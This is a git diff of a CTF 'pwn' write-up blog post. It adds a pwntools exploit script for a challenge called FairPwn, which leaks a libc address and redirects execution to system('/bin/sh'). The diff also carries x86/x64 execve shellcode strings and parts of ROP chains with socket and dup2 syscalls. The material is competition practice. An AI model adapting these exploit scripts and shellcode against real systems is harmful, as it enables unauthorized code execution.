@@ -1,5 +1,5 @@
 ---
-title: covteamctf pwn wp
+title: 2022covteamctf pwn wp
 date: 2022-07-01 16:54:59 +0800
 categories: [ctf比赛]
 tags: [pwn, ctf]
@@ -184,14 +184,6 @@ payload += p64(16)
 payload += p64(pop_rax)
 payload += p64(42)
 payload += p64(syscall_ret)
-# #dup2(soc, 0)# 这里可省略这一步
-# payload += p64(pop_rdi)
-# payload += p64(0)
-# payload += p64(pop_rsi)
-# payload += p64(0)
-# payload += p64(pop_rax)
-# payload += p64(33)
-# payload += p64(syscall_ret)
 #dup2(soc, 1)
 payload += p64(pop_rdi)
 payload += p64(0)
@@ -363,6 +355,63 @@ edit(1,'a'*0x420 + p64(fake_heap_addr + 0x20))# call setcontext
 #getshell
 p.sendlineafter('>>','5')
 sla('your name is?','e4l4')
+
+p.interactive()
+```
+
+## FairPwn
+
+```python
+# _*_ coding:utf-8 _*_
+# 2.23-0ubuntu3_amd64
+from pwn import *
+context.log_level = 'debug'
+context.arch='amd64'
+
+p = process('./pwn4')
+elf = ELF("./pwn4")
+# libc = ELF("./libc-2.27.so")
+libc = elf.libc
+
+def dbg():
+    gdb.attach(p)
+    pause()
+
+#-----------------------------------------------------------------------------------------
+s       = lambda data               :p.send(str(data))
+sa      = lambda text,data          :p.sendafter(text, str(data))
+sl      = lambda data               :p.sendline(str(data))
+sla     = lambda text,data          :p.sendlineafter(text, str(data))
+r       = lambda num=4096           :p.recv(num)
+ru      = lambda text               :p.recvuntil(text)
+uu32    = lambda                    :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
+uu64    = lambda                    :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
+lg      = lambda s                  :p.success('%s -> 0x%x' % (s, eval(s)))
+
+sh_x86_18="\x6a\x0b\x58\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
+sh_x86_20="\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
+sh_x64_21="\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05"
+#https://www.exploit-db.com/shellcodes
+#-----------------------------------------------------------------------------------------
+
+
+puts_got = elf.got['puts']
+
+stderr = 0x4040A0
+p.sendafter("Please enter your name:",'c'*0x20)
+p.sendafter("Please enter your message:",p64(stderr).ljust(0x100,'b'))
+
+
+ru("Your Message: ")
+libc_base = uu64()-0x3c5540
+lg('libc_base')
+
+system = libc_base+libc.sym['system']
+p.sendafter("Your Name are right?",'F')
+p.sendafter("Please enter your name again:",'/bin/sh\x00'+'c'*0x18)
+p.sendafter("Your Message are right?",'F')
+pl = p64(0x601e28)+p64(libc_base+0x5f0168)+p64(libc_base+0x3e06a0)+p64(system)
+p.sendafter('Please enter your Message again: ',pl)
 
 p.interactive()
 ```
